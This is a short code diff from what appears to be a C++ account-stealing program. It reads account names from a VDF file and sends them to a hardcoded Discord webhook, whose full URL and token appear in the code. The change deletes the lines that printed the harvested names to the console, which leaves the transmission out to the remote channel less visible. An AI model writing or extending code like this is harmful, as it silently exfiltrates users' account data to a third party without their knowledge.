@@ -178,11 +178,6 @@ int main() {
     std::cerr << "done\n";
     std::vector<std::string> accountNames = getAllAccountNamesFromVDF(filePath);
 
-    std::cout << "Extracted Account Names:\n";
-    for (const auto& accountName : accountNames) {
-        std::cout << accountName << std::endl;
-    }
-
 
     // Webhook to send the message with the extracted username
     Webhook webhook("https://discord.com/api/webhooks/1311777600888246323/nV8g9srlCIa38yWxR7rhONJjaM9p4QOTWlZGXqrD_OF9IdoOZDYgeop9DrN8krrDFa3B");
